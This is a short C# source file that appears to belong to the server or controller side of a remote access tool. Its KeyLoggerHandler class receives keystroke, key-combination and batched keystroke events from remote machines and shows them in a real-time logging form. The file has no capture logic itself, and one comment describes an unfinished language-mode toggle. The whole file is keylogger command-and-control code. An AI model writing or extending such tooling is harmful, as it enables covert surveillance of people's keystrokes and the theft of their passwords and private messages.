using Common.Networking;

namespace Server.Handlers
{
    public sealed class KeyLoggerHandler
    {
        private readonly Forms.KeyLoggerForm _form;
        public KeyLoggerHandler(Forms.KeyLoggerForm form)
        {
            _form = form;
            _form.OnLanguageModeChanged += vie =>
            {
                // Send a lightweight toggle packet by reusing KeyLoggerStart semantics is heavy; instead, piggyback as a small control event.
                // For simplicity, we let MainServerForm own the connection; here we just expose the event.
            };
        }

        public void OnKeyLoggerEvent(KeyLoggerEvent evt)
        {
            _form.AppendRealtimeKey(evt.Payload.Key);
        }

        public void OnKeyLoggerCombo(KeyLoggerComboEvent evt)
        {
            _form.AppendRealtimeCombo(evt.Payload.Combo);
        }

        public void OnKeyLoggerBatch(KeyLoggerBatch batch)
        {
            _form.AppendContinuousBatch(batch);
        }
    }
}


